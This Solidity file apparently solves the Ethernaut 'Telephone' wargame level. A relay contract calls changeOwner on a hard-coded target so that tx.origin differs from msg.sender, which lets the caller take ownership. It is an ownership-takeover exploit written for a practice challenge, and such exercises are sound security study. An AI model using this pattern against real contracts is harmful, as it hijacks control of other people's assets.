// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DT {
    function changeOwner(address _owner) public {}
}

contract Telephone {
    DT public deployed = DT(0x73924cF4A525169022545c09112DB47819e095D8);
    function changeOwner(address _owner) public {
        deployed.changeOwner(_owner);
    }
}